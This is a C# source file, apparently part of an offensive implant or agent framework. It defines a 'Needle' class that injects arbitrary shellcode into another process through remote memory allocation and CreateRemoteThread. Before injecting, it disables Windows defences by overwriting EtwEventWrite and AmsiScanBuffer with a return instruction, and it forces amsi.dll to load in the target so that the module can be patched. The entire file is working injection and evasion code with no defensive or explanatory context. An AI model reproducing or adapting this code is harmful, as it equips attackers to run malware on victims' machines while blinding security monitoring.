using System;
using System.Diagnostics;
using System.Text;

using static Agent.PInvoke.NativeMethods;

namespace Agent.Utilities
{
    public class Needle
    {
        readonly PROCESS_INFORMATION Pi;
        readonly bool PatchEtw;
        readonly bool PatchAmsi;

        readonly byte[] Patch = new byte[] { 0xC3 };

        public Needle(PROCESS_INFORMATION Pi, bool PatchEtw = true, bool PatchAmsi = true)
        {
            this.Pi = Pi;
            this.PatchEtw = PatchEtw;
            this.PatchAmsi = PatchAmsi;
        }

        public void Inject(byte[] Shellcode)
        {
            if (PatchEtw)
            {
                PatchEtwEventWrite();
            }

            if (PatchAmsi)
            {
                PatchAmsiScanBuffer();
            }

            var memory = Kernel32.VirtualAllocEx(
                Pi.hProcess,
                IntPtr.Zero,
                (uint)Shellcode.Length,
                0x1000 | 0x2000,
                0x40
                );

            Kernel32.WriteProcessMemory(
                Pi.hProcess,
                memory,
                Shellcode,
                (uint)Shellcode.Length,
                out UIntPtr bytesWritten
                );

            Kernel32.CreateRemoteThread(
                Pi.hProcess,
                IntPtr.Zero,
                0,
                memory,
                IntPtr.Zero,
                0,
                IntPtr.Zero
                );
        }

        void PatchEtwEventWrite()
        {
            var module = Kernel32.LoadLibraryEx("ntdll.dll", IntPtr.Zero, 0);
            var address = Kernel32.GetProcAddress(module, "EtwEventWrite");

            Kernel32.VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                0x40,
                out uint flOldProtect
                );

            Kernel32.WriteProcessMemory(
                Pi.hProcess,
                address,
                Patch,
                (uint)Patch.Length,
                out UIntPtr _
                );

            Kernel32.VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                flOldProtect,
                out uint _
                );
        }

        void PatchAmsiScanBuffer()
        {
            var module = Kernel32.LoadLibraryEx("amsi.dll", IntPtr.Zero, 0);
            var address = Kernel32.GetProcAddress(module, "AmsiScanBuffer");

            CheckModuleLoaded("amsi.dll");

            Kernel32.VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                0x40,
                out uint flOldProtect
                );

            Kernel32.WriteProcessMemory(
                Pi.hProcess,
                address,
                Patch,
                (uint)Patch.Length,
                out UIntPtr _
                );

            Kernel32.VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                flOldProtect,
                out uint _
                );
        }

        void CheckModuleLoaded(string moduleName, bool loadLib = true)
        {
            var modules = Process.GetProcessById(Pi.dwProcessId).Modules;

            var present = false;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                {
                    present = true;
                    break;
                }
            }

            if (!present && loadLib)
            {
                var encodedModuleName = Encoding.UTF8.GetBytes(moduleName);

                var mem = Kernel32.VirtualAllocEx(
                    Pi.hProcess,
                    IntPtr.Zero,
                    (uint)encodedModuleName.Length,
                    0x1000 | 0x2000,
                    0x40
                    );

                Kernel32.WriteProcessMemory(
                    Pi.hProcess,
                    mem,
                    encodedModuleName,
                    (uint)encodedModuleName.Length,
                    out UIntPtr _
                    );

                var kernel = Kernel32.LoadLibraryEx("kernel32.dll", IntPtr.Zero, 0);
                var loadLibrary = Kernel32.GetProcAddress(kernel, "LoadLibraryA");

                Kernel32.CreateRemoteThread(
                    Pi.hProcess,
                    IntPtr.Zero,
                    0,
                    loadLibrary,
                    mem,
                    0,
                    IntPtr.Zero
                    );
            }
        }
    }
}